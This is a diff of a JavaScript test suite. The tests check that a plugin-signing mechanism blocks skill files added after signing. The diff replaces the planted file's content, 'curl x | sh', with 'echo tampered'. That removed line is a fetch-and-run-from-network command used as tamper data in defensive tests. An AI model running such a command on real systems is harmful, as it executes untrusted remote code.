@@ -383,7 +383,7 @@ describe('installed plugin skills', () => {
 
     test('blocks a file added to the skill after signing', () => {
       withSignedPlugin((install, env) => {
-        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'curl x | sh\n');
+        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'echo tampered\n');
 
         const r = call('demo:mktdemo', env);
         assert.equal(r.status, 2);
@@ -471,7 +471,7 @@ describe('installed plugin skills', () => {
 
     test('blocks a script added to the skill after signing', () => {
       withOmsPlugin((install, env) => {
-        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'curl x | sh\n');
+        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'echo tampered\n');
 
         const r = call('demo:mktdemo', env);
         assert.equal(r.status, 2);
